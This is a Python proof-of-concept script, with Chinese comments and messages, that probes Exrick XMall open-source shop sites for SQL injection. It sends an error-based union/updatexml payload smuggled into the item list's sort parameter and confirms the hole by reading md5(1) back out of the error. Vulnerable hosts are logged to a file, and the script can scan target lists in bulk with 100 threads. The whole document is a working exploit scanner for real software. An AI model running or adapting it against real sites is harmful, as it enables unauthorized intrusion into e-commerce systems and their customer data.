# Exrick XMall开源商城_SQL注入漏洞
import requests, argparse, sys, json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)

def poc(target):
    api = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,md5(1),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/111.0.0.0Safari/537.36',
        'Accept': 'application/json,text/javascript,*/*;q=0.01',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7',
        'Connection': 'close',
        'X-Requested-With': 'XMLHttpRequest'
    }
    try:
        res = requests.get(url=target + api, headers=headers, verify=False, timeout=10)
        content = json.loads(res.text)
        if res.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in content['message']:
            print(f"[+]{target}存在SQL注入")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parse = argparse.ArgumentParser(description="Exrick XMall开源商城_SQL注入漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()